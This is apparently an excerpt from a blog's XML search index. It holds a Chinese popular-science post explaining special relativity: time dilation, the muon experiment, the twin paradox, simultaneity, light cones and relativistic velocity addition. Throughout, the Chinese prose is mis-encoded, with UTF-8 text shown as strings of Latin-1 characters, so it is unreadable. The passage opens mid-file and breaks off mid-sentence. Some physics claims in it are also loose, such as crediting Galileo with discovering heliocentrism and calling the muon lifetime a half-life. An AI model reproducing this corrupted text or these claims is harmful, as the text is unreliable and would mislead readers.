        <tags>
            
            <tag> decode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç›¸å¯¹è®º</title>
      <link href="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/"/>
      <url>/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="ç›¸å¯¹è®ºçš„ç®€å•ä¿¡å¿µ"><a href="#ç›¸å¯¹è®ºçš„ç®€å•ä¿¡å¿µ" class="headerlink" title="ç›¸å¯¹è®ºçš„ç®€å•ä¿¡å¿µ"></a>ç›¸å¯¹è®ºçš„ç®€å•ä¿¡å¿µ</h2><p>é¦–å…ˆæˆ‘ä»¬æ¥è®²ä¸€è®²ç°ä»£ç‰©ç†å­¦çš„å¼€å§‹ã€‚<br>æ•…äº‹è¦ä»ä¼½åˆ©ç•¥å‘ç°æ—¥å¿ƒè¯´å¼€å§‹ï¼Œé‚£æ—¶å€™çš„äººéƒ½ç›¸ä¿¡æ‰€æœ‰çš„æ˜Ÿæ˜Ÿéƒ½æ˜¯ç»•ç€åœ°çƒåšè¿åŠ¨çš„ã€‚ä½†æ˜¯ä¼½åˆ©ç•¥çœ‹ç ´äº†çº¢å°˜ï¼Œä»–æ˜ç™½äº†åœ°çƒå’Œå…¶ä»–è¡Œæ˜Ÿéƒ½æ˜¯ç»•ç€å¤ªé˜³åšè¿åŠ¨ã€‚è€Œä¸”å¹¶æ²¡æœ‰ä»€ä¹ˆç²¾çµåœ¨æ¨ç€è¡Œæ˜Ÿåšè¿åŠ¨ï¼Œåªéœ€è¦å¤ªé˜³æ–½åŠ ä¸€ä¸ªå¸å¼•åŠ›å°±å¯ä»¥ã€‚<br>ç¬¬äºŒä¸ªäººæ˜¯ç‰›é¡¿ã€‚<br>ç‰›é¡¿çš„ç¬¬ä¸€å®šå¾‹æè¿°äº†ï¼Œåœ¨æ²¡æœ‰å¤–åŠ›çš„ä½œç”¨ä¸‹ï¼Œç‰©ä½“ä¼šä¿æŒé™æ­¢æˆ–è€…åŒ€é€Ÿç›´çº¿è¿åŠ¨ã€‚ åŒ€é€Ÿç›´çº¿è¿åŠ¨å’Œé™æ­¢ä¸€æ ·æ— éœ€å¤–åŠ›ã€‚<br>ç‰›é¡¿çš„ç¬¬äºŒå®šå¾‹æè¿°äº†ï¼ŒåŠ›ä¼šæ”¹å˜ç‰©ä½“çš„è¿åŠ¨æ–¹å¼ã€‚ è¯·æ³¨æ„ï¼Œè¿™é‡Œè¯´çš„æ˜¯ï¼ŒåŠ›ï¼Œæ˜¯<strong>æ”¹å˜</strong>è¿åŠ¨çš„åŸå› ã€‚è€Œä¸æ˜¯åŠ›æ˜¯è¿åŠ¨çš„åŸå› ã€‚<br>ç‰›é¡¿çœ‹ç ´äº†çº¢å°˜ï¼Œåœ¨ä»–çš„çœ¼é‡Œï¼Œè¿åŠ¨å’Œé™æ­¢æ˜¯ä¸€å›äº‹ã€‚</p><p>ç¬¬ä¸‰ä¸ªäººæ˜¯çˆ±å› æ–¯å¦ã€‚<br>çœ‹åˆ°äº†æˆ‘ä»¬æ˜¯ç›¸å¯¹äºä¸åŒåæ ‡ç³»ä¸‹æ¥è®¨è®ºè¿™äº›é—®é¢˜çš„ï¼Œè¿™ç«è½¦ä¸Šï¼Œä½ å°„ç®­ã€‚ç›¸å¯¹äºç«è½¦è¿™ä¸ªåæ ‡ç³»ï¼Œä½ çœ‹åˆ°çš„æ˜¯å°„ç®­çš„é€Ÿåº¦ã€‚ è€Œç›¸å¯¹äºåœ°é¢è¿™ä¸ªåæ ‡ç³»ï¼Œé‚£å°„ç®­çš„é€Ÿåº¦å°±æ˜¯ç«è½¦çš„é€Ÿåº¦åŠ ä¸Šå°„ç®­çš„é€Ÿåº¦ã€‚<br>å¯èƒ½æœ‰äººä¼šè¯´ï¼Œè¿™ä¸å°±æ˜¯å“²å­¦ä¸Šçš„å‚è€ƒä¸åŒçš„åæ ‡ç³»å˜›ï¼Œæˆ‘ä»¬å“²å­¦å®¶å–èŒ¶çš„åŠŸå¤«æ—©å°±çŸ¥é“äº†ã€‚ ä½†æ˜¯çˆ±å› æ–¯å¦å‘ç°äº†è®©å“²å­¦å®¶å–å¤šå°‘èŒ¶éƒ½æƒ³ä¸åˆ°çš„äº‹æƒ…ã€‚<br>å½“ä½ åœ¨ç«è½¦ä¸Šæ‰“æ‰‹ç”µç­’ï¼Œæ‰‹ç”µç­’çš„å…‰çš„é€Ÿåº¦ä¼šä¸ä¼šæ˜¯ç›¸å¯¹äºåœ°é¢çš„åæ ‡ç³»æ˜¯å…‰é€ŸåŠ ä¸Šç«è½¦çš„é€Ÿåº¦å‘¢ï¼Ÿ<br>ç­”æ¡ˆæ˜¯ä¸ä¼šï¼Œæ— è®ºä½ ä»å“ªé‡Œå»è§‚å¯Ÿï¼Œå…‰é€Ÿéƒ½æ˜¯ä¸€å®šçš„ã€‚å¤©ä¸Šå’Œåœ°ä¸‹æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬è¿™é‡Œå’Œå¤–æ˜Ÿäººé‚£é‡Œä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚<br>è¿™æ˜¯çˆ±å› æ–¯å¦çš„æ´è§ï¼Œä¹Ÿæ˜¯ç›¸å¯¹è®ºå’ŒåŸºç¡€ã€‚</p><h2 id="ç”µç£åœºè‹±é›„å£®ä¸¾"><a href="#ç”µç£åœºè‹±é›„å£®ä¸¾" class="headerlink" title="ç”µç£åœºè‹±é›„å£®ä¸¾"></a>ç”µç£åœºè‹±é›„å£®ä¸¾</h2><p>è‹±å›½ç‰©ç†å­¦å®¶è©¹å§†æ–¯ã€‚å…‹æ‹‰å…‹ã€‚éº¦å…‹æ–¯éŸ¦ç»Ÿä¸€äº†ç”µç£å­¦ã€‚</p><p>å½“æ—¶çš„ç‰©ç†å­¦å¥½åƒæœ‰ç‚¹æ‚ä¹±æ— ç« ï¼Œè¿™æ—¶å€™éº¦å…‹æ–¯éŸ¦å­¦ä¼—å®¶ä¹‹é•¿ï¼Œç„¶åå‘ç°äº†ç”µç£å­¦ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬å¼„æ¸…æ¥šï¼š<br>ä»€ä¹ˆæ˜¯ç”µï¼Ÿç”µæ˜¯ç”µè·ä¹‹é—´çš„ç›¸äº’ä½œç”¨ã€‚ç”µå­å¸¦è´Ÿç”µï¼Œç¦»å­å¸¦æ­£ç”µã€‚ç”µå­å’Œç¦»å­äº§ç”Ÿå¸å¼•åŠ›ã€‚<br>ä»€ä¹ˆæ˜¯ç£å‘¢ï¼Ÿ ç£æ¥æºäºç”µï¼Œæ˜¯ç”µè·çš„è¿åŠ¨äº§ç”Ÿäº†ç£ã€‚ ç”µæµå‘¨å›´å°±ä¼šæœ‰ç£ã€‚</p><p>ä»€ä¹ˆæ˜¯åœºï¼Ÿ ç”µè·ä¸ç”µè·ä¹‹é—´æ²¡æœ‰ä»€ä¹ˆ<em>è¶…è·ä½œç”¨</em>ï¼Œæ˜¯ç”µè·å‘¨ä¼šæœ‰åœºï¼Œç”µè·é€šè¿‡åœºæ¥ç›¸äº’ä½œç”¨ã€‚<br>ä»€ä¹ˆæ˜¯ç”µç£åœºï¼Ÿ æ˜¯ç”µåœºå’Œç£åœºç›¸äº’å åŠ çš„ä¸€ä¸ªæ€»æè¿°ï¼Œå«åšç”µç£åœºã€‚</p><p>ç”µå¯ä»¥ç”Ÿç£ï¼Ÿå˜åŒ–çš„ç£åœºäº§ç”Ÿç”µåœºï¼Œ åè¿‡æ¥ï¼Œå˜åŒ–çš„ç”µåœºäº§ç”Ÿç£åœºã€‚<strong>å…¶ä¸­ä¸éœ€è¦ç”µè·çš„å­˜åœ¨</strong>ã€‚<br>è¿™æ—¶ï¼Œéº¦å…‹æ–¯éŸ¦æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ç”¨ä¸€ä¸ªæŒ¯è¡å™¨æ¥äº§ç”Ÿå‘¨æœŸå˜åŒ–çš„ç£åœºï¼Œé‚£ä¹ˆå‘¨æœŸå˜åŒ–çš„ç£åœºï¼Œå°±ä¼šäº§ç”Ÿç”µåœºã€‚è€Œå‘¨æœŸå˜åŒ–çš„ç”µåœºåˆä¼šäº§ç”Ÿæ–°çš„ç£åœºï¼Œè¿™ä¹ˆè¿™æ ·å°±å¯ä»¥ä¸€ç›´ä¼ æ’­ä¸‹å»ã€‚è¿™å°±æ˜¯<strong>ç”µç£æ³¢</strong>ã€‚</p><p>ç”µå’Œç£çš„æœ‰è§„å¾‹çš„ç›¸äº’è½¬åŒ–ï¼Œäº§ç”Ÿäº†ç”µç£æ³¢ã€‚<br>æ ¹æ®æµ‹é‡ï¼Œç”µç£æ³¢çš„ä¼ æ’­é€Ÿåº¦å’Œå…‰é€Ÿä¸€è‡´ã€‚<br>éº¦å…‹æ–¯éŸ¦å®£å¸ƒï¼Œ<strong>å…‰å…¶å®å°±æ˜¯ç”µç£æ³¢</strong>ã€‚</p><blockquote><p>è¿™æ˜¯ç‰©ç†å­¦å®¶å†ä¸€æ¬¡çœ‹ç ´äº†çº¢å°˜ã€‚å¤©ä¸Šçš„ä¸œè¥¿å’Œåœ°ä¸Šæ˜¯ä¸€å›äº‹ï¼ŒåŒ€é€Ÿç›´çº¿è¿åŠ¨å’Œé™æ­¢æ˜¯ä¸€å›äº‹ï¼Œç”µå’Œç£æ˜¯ä¸€å›äº‹ï¼Œè€Œç°åœ¨éº¦å…‹æ–¯éŸ¦è¯´ï¼Œå…‰è·Ÿç”µç£åœºï¼Œå…¶å®ä¹Ÿæ˜¯ä¸€å›äº‹ã€‚</p></blockquote><p>ä½†æ˜¯ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªç”µç£æ³¢æ˜¯æ ¹æ®ä»€ä¹ˆåæ ‡ç³»æ¥è§‚æµ‹çš„ï¼Ÿ æ˜¯å‘é€ç”µç£æ³¢çš„ä»ªå™¨å—ï¼Ÿ ä½†æ˜¯å¤©æ–‡å­¦å®¶å‘ç°ï¼ŒåŒæ˜Ÿç³»ç»Ÿï¼Œå…¶ä¸­ä¸€ä¸ªé è¿‘æˆ‘ä»¬ï¼Œé‚£å¦ä¸€ä¸ªå°±æ˜¯è¿œç¦»æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œè§‚æµ‹åˆ°çš„ä¸¤ä¸ªè¡Œæ˜Ÿçš„ç”µç£æ³¢çš„é€Ÿåº¦å…¶å®æ˜¯ä¸€æ ·çš„ã€‚</p><p>å½“æ—¶çš„äººä»¬è®¤ä¸ºç©ºé—´ä¸­å­˜åœ¨<em>ä»¥å¤ª</em>è¿™ç§ç‰©è´¨æ¥ä¼ æ’­ï¼Œä½†æ˜¯è¢«è¯æ˜ä¸å­˜åœ¨ã€‚</p><p>æ­¤æ—¶çˆ±å› æ–¯å¦ç™»åœº</p><blockquote><p>ä¸€èˆ¬æƒ…å†µä¸‹å¸ˆé•¿ä»¬éƒ½å‘Šè¯‰ä½ è¦é€‚åº”ä¸–ç•Œã€‚çˆ±å› æ–¯å¦ä¸æ˜¯æ¥é€‚åº”ä¸–ç•Œçš„ï¼Œä»–æ˜¯æ¥æ”¹å˜ä¸–ç•Œçš„ã€‚</p></blockquote><h2 id="åˆºæ¿€1905"><a href="#åˆºæ¿€1905" class="headerlink" title="åˆºæ¿€1905"></a>åˆºæ¿€1905</h2><p>è¿™ä¸€å¹´ç§°ä¸ºå¥‡è¿¹å¹´ï¼Œçˆ±å› æ–¯å¦å‘è¡¨äº†æ•°ç¯‡è®ºæ–‡ï¼Œå¼•å‘äº†äººç±»å…³äºç‰©ç†ä¸–ç•Œçš„åŸºæœ¬æ¦‚å¿µ â€“ æ—¶é—´ã€ç©ºé—´ã€èƒ½é‡ã€å…‰å’Œç‰©è´¨ â€“ çš„ä¸‰å¤§é©å‘½ã€‚</p><p>é¦–å…ˆï¼Œçˆ±å› æ–¯å¦æ–­è¨€ï¼š</p><blockquote><p><strong>ä¸€åˆ‡é™æ­¢æˆ–è€…åŒ€é€Ÿç›´çº¿è¿åŠ¨çš„åæ ‡ç³»ä¸‹ï¼Œç‰©ç†å®šå¾‹éƒ½ä¸€æ ·ã€‚</strong></p></blockquote><p>è¿™è¡¨æ˜äº†ä¸åªæœ‰åŠ›åœ¨åæ ‡ç³»ä¸‹éƒ½ä¸€æ ·ï¼Œè€Œæ˜¯æ‰€æœ‰ç‰©ç†å®šå¾‹ â€“ åŒ…æ‹¬ç”µåŠ¨åŠ›å­¦ â€“ éƒ½ä¸€æ ·ã€‚</p><p>å¹¶ä¸”æ–­è¨€ï¼Œ<strong>å…‰é€Ÿæ— è®ºæ˜¯ä»€ä¹ˆåæ ‡ç³»ä¸‹ï¼Œéƒ½ä¸€æ ·ã€‚</strong><br>$$ c = 299,792,458 m/s $$</p><p>ä½ æ‰€æ„Ÿè§‰çš„å…‰é€Ÿåœ¨ç«è½¦ä¸Šè¿˜æ˜¯åœ°ä¸Šçš„é€Ÿåº¦é—®é¢˜ï¼Œå¹¶ä¸æ˜¯å…‰é€Ÿçš„é—®é¢˜ï¼Œè€Œæ˜¯ä½ çš„æ—¶ç©ºè§‚æœ‰é—®é¢˜ã€‚</p><p>ç°åœ¨å‡è®¾ä½ åœ¨ç«è½¦ä¸Šå‘å¤©èŠ±æ¿ç…§ä¸€æŸå…‰ï¼Œæ˜¯å‘ä¸‹é¢è¿™æ ·çš„ã€‚</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_1.jpg" alt="Alt text| center | 200*0"></p><p>è€Œåœ¨åœ°é¢ä¸Šçš„äººçœ‹åˆ°çš„ç»“æœæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_2.jpg" alt="Alt text | center | 500*0"></p><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œåœ¨åœ°é¢åæ ‡ç³»ç§ï¼Œå…‰èµ°çš„æ˜¯æ–œçº¿ã€‚<br>è·ç¦»Dæ¯”Lè¦é•¿ï¼Œå…‰é€Ÿä¸å˜ï¼Œæ‰€ä»¥æ—¶é—´æ›´é•¿ã€‚</p><p>ç»“è®ºæ˜¯ï¼Œåœ¨ç«è½¦ä¸Šä½ æ„Ÿè§‰åˆ°çš„æ—¶é—´è¦æ¯”åœ¨å¤–é¢çš„æ—¶é—´çŸ­ã€‚<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_3.png" alt="Alt text | left | 300*0"></p><p>$ v \uparrow \rightarrow \Delta tâ€™ \uparrow$</p><p>é€Ÿåº¦è¶Šå¿«ï¼Œ $\Delta tâ€™ \uparrow $ å°±è¶Šå¤§åœ¨å¤–é¢æ„Ÿå—åˆ°çš„æ—¶é—´å°±è¶Šå¿«ã€‚ç›¸å¯¹çš„ï¼Œ$\Delta t \downarrow$ å°±è¶Šå°ï¼Œé‡Œé¢çš„äººæ„Ÿå—åˆ°çš„æ—¶é—´å°±è¶Šæ…¢ã€‚<br>æ‰€ä»¥åœ¨åœ°é¢åæ ‡ç³»ä¸‹çœ‹ï¼Œåœ°ä¸Šçš„äººæ„Ÿå—åˆ°çš„æ—¶é—´æ²¡æœ‰å˜åŒ–ï¼Œè€Œç«è½¦é‡Œçš„äººçš„æ—¶é—´å˜æ…¢äº†ã€‚<strong>æ˜¯æ—¶é—´æœ¬èº«å˜æ…¢äº†</strong></p><h2 id="ç©¿è¶Šåˆ°æœªæ¥"><a href="#ç©¿è¶Šåˆ°æœªæ¥" class="headerlink" title="ç©¿è¶Šåˆ°æœªæ¥"></a>ç©¿è¶Šåˆ°æœªæ¥</h2><ul><li>è¿™éƒ¨åˆ†å¯ä»¥å‚è€ƒ<a href="https://b23.tv/l72627Q">å¯è§†åŒ–è§£é‡Š</a></li></ul><h3 id="çœŸçš„å¯ä»¥é•¿å¯¿"><a href="#çœŸçš„å¯ä»¥é•¿å¯¿" class="headerlink" title="çœŸçš„å¯ä»¥é•¿å¯¿"></a>çœŸçš„å¯ä»¥é•¿å¯¿</h3><p>ç›¸å¯¹è®ºçš„æ ¸å¿ƒåœ¨äºå¤„äºä¸ç”¨çš„åæ ‡ç³»æ¥è§‚å¯Ÿã€‚</p><p>æˆ‘ä»¬å¯ä»¥åšè¿™æ ·çš„ä¸€ä¸ªå®éªŒã€‚<br>æœ‰ä¸€ä¸ªæ˜Ÿçƒè·ç¦»æˆ‘ä»¬80å…‰å¹´ï¼Œæˆ‘ä»¬é€šè¿‡åŠ é€Ÿåˆ°0.8cçš„å®‡å®™é£èˆ¹é£åˆ°é‚£ä¸ªæ˜Ÿçƒã€‚<br>åœ¨åœ°é¢ä¸Šçš„äººçœ‹ï¼Œè¿™æ®µæ—¶é—´éœ€è¦èŠ±ä¸Š100å¹´ã€‚ è€Œé£èˆ¹ä¸Šçš„å®‡èˆªå‘˜è‡ªå·±åˆ™ä¼šæ„Ÿè§‰åˆ°åªè¿‡å»äº†60å¹´ã€‚åæ ‡ç³»ä¸‹çš„æ—¶é—´ä¼šå‘ç”Ÿ<strong>æ—¶é—´è†¨èƒ€</strong>ã€‚<br>è¦ç”¨è¿™ä¸ªæ–¹æ³•æ¥éªŒè¯æ˜¾ç„¶ä¸å¤ªç°å®ã€‚ä½†æ˜¯ç‰©ç†å­¦å®¶æƒ³åˆ°äº†å¦å¤–ä¸€ç§å®éªŒæ–¹æ³•ã€‚</p><p>æœ‰ä¸€ç§å«åš$\mu$å­çš„åŸºæœ¬ç²’å­ï¼Œä»–æœ‰ä¸€åŸºæœ¬ç‰¹æ€§å°±æ˜¯ç‰¹åˆ«ç‰¹åˆ«çŸ­å‘½ã€‚ åŠè¡°æœŸæ˜¯2.2å¾®ç§’ã€‚ä¹Ÿå°±æ˜¯è¯´ç»™ä½ ä¸€å †$\mu$å­ï¼Œä»–ä»¬ä¼šåœ¨2.2å¾®ç§’ååªå‰©ä¸‹ä¸€åŠäº†ï¼Œç„¶åå†è¿‡2.2å¾®ç§’åˆæœ‰ä¸€åŠæœ¨æœ‰äº†ã€‚<br>è€Œè¿™ä¸ªå®éªŒå°±æ˜¯å°†ä¸€å †$\mu$å­ä»å±±é¡¶ä¸ŠåŠ é€Ÿåˆ°0.9994cçš„å…‰é€Ÿï¼Œç„¶åä¸¢ä¸‹æ¥ã€‚å¦‚æœåˆ°åœ°é¢ä¸Šçš„$\mu$å­æ•°é‡å¤§äºåœ¨é™æ­¢åæ ‡ç³»ä¸‹å¾—åˆ°çš„æ•°é‡ï¼Œé‚£ä¹ˆç›¸å¯¹è®ºå°±æ˜¯æ­£ç¡®çš„ã€‚</p><p>å®éªŒç»“æœå®Œç¾çš„ç¬¦åˆäº†ç›¸å¯¹è®ºçš„é¢„æµ‹ï¼Œå¹³å‡å¯¿å‘½è¢«å»¶é•¿äº†29.3å€ï¼</p><p>ç›¸å¯¹è®ºä¸ä½†æ­£ç¡®ï¼Œè€Œä¸”éå¸¸ç²¾ç¡®ã€‚</p><h3 id="åŒç”Ÿå­ä½¯è°¬"><a href="#åŒç”Ÿå­ä½¯è°¬" class="headerlink" title="åŒç”Ÿå­ä½¯è°¬"></a>åŒç”Ÿå­ä½¯è°¬</h3><p>é—®é¢˜æ˜¯è¿™æ ·çš„ï¼Œä½ å¦¹å¦¹åœ¨åœ°çƒä¸Šï¼Œè€Œä½ åä¸Šäº†å®‡å®™é£èˆ¹ã€‚<br>åœ¨å¦¹å¦¹çš„åæ ‡ç³»ä¸­ï¼Œä½ å¤„äºé«˜é€Ÿè¿åŠ¨ä¸­ï¼Œä½ çš„æ—¶é—´å˜æ…¢äº†ã€‚<br>è€Œåœ¨ä½ çš„åæ ‡ç³»ä¸­ï¼Œå¦¹å¦¹åŒæ ·ä¹Ÿæ˜¯é«˜é€Ÿç¦»å¼€ï¼Œé‚£å¦¹å¦¹çš„æ—¶é—´ä¹Ÿå˜æ…¢äº†ã€‚</p><p class='quest'>é‚£ä½ é£ä¸€åœˆå›æ¥åï¼Œæ˜¯ä½ æ¯”å¦¹å¦¹å¹´è½»è¿˜æ˜¯å¦¹å¦¹æ¯”ä½ å¹´è½»å‘¢ï¼Ÿ<p class='answer'>è¿™ä¸ªé—®é¢˜çš„å…³é”®åœ¨äºä½ çš„åæ ‡ç³»å’Œä½ å¦¹å¦¹çš„åæ ‡ç³»å¹¶ä¸æ˜¯ç­‰ä»·çš„ã€‚<p>ä½ æ‰€å¤„äºçš„è¿åŠ¨è¿‡ç¨‹ï¼Œè¦æœ‰åŠ é€Ÿï¼ŒåŒ€é€Ÿç›´çº¿å‡é€Ÿæ‰å¤´å†åŠ é€Ÿæœ€åå‡é€Ÿçš„è¿‡ç¨‹ã€‚å¹¶ä¸å…¨éƒ½æ˜¯åŒ€é€Ÿç›´çº¿è¿åŠ¨ã€‚<br>è®¡ç®—çš„è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œä½†æ˜¯ç»“è®ºæ˜¯çœŸå®çš„ã€‚å¹¶ä¸”ä½ ä¼šæ¯”ä½ å¦¹å¦¹å¹´è½»ä¸€äº›ã€‚</p><h3 id="æ—¶ç©ºæ˜¯ç›¸å¯¹çš„"><a href="#æ—¶ç©ºæ˜¯ç›¸å¯¹çš„" class="headerlink" title="æ—¶ç©ºæ˜¯ç›¸å¯¹çš„"></a>æ—¶ç©ºæ˜¯ç›¸å¯¹çš„</h3><p>å’Œ<strong>æ—¶é—´è†¨èƒ€</strong>å¯¹åº”çš„æ˜¯<strong>é•¿åº¦æ”¶ç¼©</strong></p><p>å½“å®‡èˆªå‘˜ç”¨20å¹´çš„æ—¶é—´å®Œæˆäº†æœ¬æ¥éœ€è¦30å¹´æ‰èƒ½å®Œæˆçš„è·¯ç¨‹ã€‚é‚£ä¹ˆç›¸å¯¹äºå®‡èˆªå‘˜æ¥çœ‹ã€‚è¿™æ®µè·¯ç¨‹å®é™…ä¸Šæ˜¯å˜çŸ­äº†ã€‚</p><p>æˆ‘ä»¬æ‰€å¤„çš„åæ ‡ç³»ä¸‹ï¼Œå…¶å®å’Œå¤–æ˜Ÿäººæ‰€å¤„çš„åæ ‡ç³»ã€‚åœ¨æ²¡æœ‰è”ç³»çš„æƒ…å†µä¸‹æ˜¯å®Œå…¨ä¸¤ä¸ªç‹¬ç«‹çš„æ—¶ç©ºã€‚ä½ è¿‡ä½ çš„ï¼Œæˆ‘è¿‡æˆ‘çš„ã€‚ä½†æ˜¯ä¸€æ—¦å»ºç«‹èµ·äº†è”ç³»ï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œç›¸å¯¹çš„è½¬æ¢äº†ã€‚</p><h2 id="â€œç°åœ¨â€æ˜¯ä¸€ä¸ªå¹»è§‰"><a href="#â€œç°åœ¨â€æ˜¯ä¸€ä¸ªå¹»è§‰" class="headerlink" title="â€œç°åœ¨â€æ˜¯ä¸€ä¸ªå¹»è§‰"></a>â€œç°åœ¨â€æ˜¯ä¸€ä¸ªå¹»è§‰</h2><h3 id="åŒæ—¶ä¸åŒæ—¶"><a href="#åŒæ—¶ä¸åŒæ—¶" class="headerlink" title="åŒæ—¶ä¸åŒæ—¶"></a>åŒæ—¶ä¸åŒæ—¶</h3><p>é¦–å…ˆæˆ‘ä»¬æƒ³è±¡ä¸€ä¸ªè¿åŠ¨ç«è½¦ä¸­ä¸­é—´çš„ä¸€ç›ç¯ï¼Œå‘å‡ºäº†ä¸€æŸå…‰ã€‚<br>å½“ä½ ç«™åœ¨ç«è½¦ä¸­çš„æ—¶å€™ï¼Œè¿™ä¸¤æŸå…‰æ˜¯åŒæ—¶åˆ°è¾¾äº†ç«è½¦å¤´å’Œç«è½¦å°¾éƒ¨ã€‚<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_5.jpg" alt="Alt text | center | 400*0"></p><p>è€Œå½“ä½ ç«™åœ¨å¤–é¢è§‚å¯Ÿè¿™ç›ç¯å‘å‡ºæ¥çš„å…‰çº¿ã€‚ç«è½¦ä»å·¦åˆ°å³ï¼Œé‚£ä¹ˆè¿™ä¸¤æŸå…‰çº¿æ˜¯å…ˆåˆ°è¾¾äº†è½¦å°¾ï¼Œååˆ°è¾¾äº†è½¦å¤´ã€‚<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_4.jpg" alt="Alt text | center | 400*0"></p><p>ä¸¤ä¸ªæƒ…å†µæ˜¯ä¸ç›¸åŒçš„ã€‚ åŒæ—¶è¿˜æ˜¯ä¸åŒæ—¶å®Œå…¨å–å†³äºä½ çš„åæ ‡ç³»ã€‚<br><strong>æŠ›å¼€åæ ‡ç³»è°ˆç›¸å…³æ€§éƒ½æ˜¯ç©ºè°ˆã€‚</strong></p><h3 id="å…‰é”¥ä¸­çš„æ‰æ˜¯å‘½è¿"><a href="#å…‰é”¥ä¸­çš„æ‰æ˜¯å‘½è¿" class="headerlink" title="å…‰é”¥ä¸­çš„æ‰æ˜¯å‘½è¿"></a>å…‰é”¥ä¸­çš„æ‰æ˜¯å‘½è¿</h3><p>äº‹å®ä¸Šï¼Œæˆ‘ä»¬èº«è¾¹å‘ç”Ÿçš„äº‹æƒ…éƒ½ä¸æ˜¯åŒæ—¶å‘ç”Ÿçš„ã€‚<br><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/relativity_6.jpg" alt="Alt text | center | 400*0"></p><p>è¿™æ˜¯æ—¶é—´çš„å…‰é”¥ã€‚åªæœ‰å…‰é”¥å†…çš„äº‹ä»¶æ‰æ˜¯ä¼šå—åˆ°å½±å“çš„äº‹ä»¶ã€‚<br>è¿‡å»çš„å…‰é”¥ä¸­çš„äº‹ä»¶å¯ä»¥å½±å“è§‚å¯Ÿè€…ï¼Œè€Œè§‚å¯Ÿè€…ä¹Ÿå¯ä»¥å½±å“æœªæ¥å…‰é”¥ä¸­çš„äº‹ä»¶ã€‚<br>ä½†æ˜¯å…‰é”¥å¤–çš„äº‹ä»¶æ˜¯æ— æ³•å½±å“è§‚å¯Ÿè¿™ï¼Œå¹¶ä¸”è§‚å¯Ÿè€…ä¹Ÿæ— æ³•å½±å“å…‰é”¥å¤–çš„äº‹ä»¶ã€‚</p><h2 id="è´¨é‡å°±æ˜¯èƒ½é‡"><a href="#è´¨é‡å°±æ˜¯èƒ½é‡" class="headerlink" title="è´¨é‡å°±æ˜¯èƒ½é‡"></a>è´¨é‡å°±æ˜¯èƒ½é‡</h2><h3 id="é€Ÿåº¦å åŠ "><a href="#é€Ÿåº¦å åŠ " class="headerlink" title="é€Ÿåº¦å åŠ "></a>é€Ÿåº¦å åŠ </h3><p>æˆ‘ä»¬æƒ³è±¡ä¸€ä¸‹è¿™æ ·çš„åœºæ™¯ï¼Œåœ¨ç«è½¦ä¸Šå°„å‡ºä¸€æ”¯ç®­ã€‚ç«è½¦çš„é€Ÿåº¦æ˜¯$200m/s$ï¼Œå°„å‡ºå»çš„ç®­æ˜¯$100m/s$ã€‚é‚£ä¹ˆåœ¨å¤–é¢çš„äººæ¥çœ‹ã€‚è¿™ä¸ªç®­çš„é€Ÿåº¦åº”è¯¥æ˜¯ $200 + 100 = 300m/s$ ã€‚</p><p>é‚£ä¹ˆæ˜¯ä¸æ˜¯å¯ä»¥ç±»æ¨ï¼Œåœ¨$0.8c$çš„é£èˆ¹ä¸Šï¼Œå°„å‡º$0.5c$çš„ç«ç®­ï¼Œé‚£ä¹ˆå°±æ˜¯ $0.8c + 0.5c = 1.3c$ è€Œè¶…å…‰é€Ÿäº†å‘¢ï¼Ÿ</p><p>çˆ±å› æ–¯å¦ç»™å‡ºçš„ç­”æ¡ˆæ˜¯NOã€‚å› ä¸º<em>å¿…é¡»è€ƒè™‘åˆ°æ—¶é—´è†¨èƒ€å’Œé•¿åº¦æ”¶ç¼©çš„æ•ˆåº”ã€‚</em><br>å…¶ä¸­$v$æ˜¯é£èˆ¹ç›¸å¯¹äºåœ°é¢çš„é€Ÿåº¦ï¼Œ$uâ€™$æ˜¯ç«ç®­ç›¸å¯¹äºé£èˆ¹çš„é€Ÿåº¦ï¼Œ$u$æ˜¯ç«ç®­ç›¸å¯¹äºåœ°é¢çš„é€Ÿåº¦ã€‚<br>ç«ç®­ç›¸å¯¹äºåœ°é¢çš„é€Ÿåº¦å¹¶ä¸æ˜¯ç®€å•çš„$v + uâ€™$ ã€‚é€šè¿‡ä»¥ä¸‹å…¬å¼</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/960631862.jpg" alt="Alt text | center | 200*0"></p><p>é€šè¿‡å…¬å¼çš„å‡ºæ¥çš„é€Ÿåº¦ä¸º$0.928c$ï¼Œæ˜¯æ²¡æœ‰è¶…è¿‡å…‰é€Ÿçš„ã€‚<br><strong>å¦‚æœ$uâ€™$ å’Œ $v$ éƒ½è¿œå°äºå…‰é€Ÿ$c$çš„æ—¶å€™ï¼Œé‚£ä¹ˆè¿™ä¸ªå…¬å¼å°±å¯ä»¥è¿‘ä¼¼ä¸º$u = uâ€™ + v$ å’Œæˆ‘ä»¬ç”Ÿæ´»å®šå¾‹ä¸€æ ·ã€‚</strong></p><h3 id="è´¨é‡å˜é‡"><a href="#è´¨é‡å˜é‡" class="headerlink" title="è´¨é‡å˜é‡"></a>è´¨é‡å˜é‡</h3><p>ç°åœ¨æ¥çœ‹å¦å¤–ä¸€ä¸ªä¾‹å­</p><p>ä½ 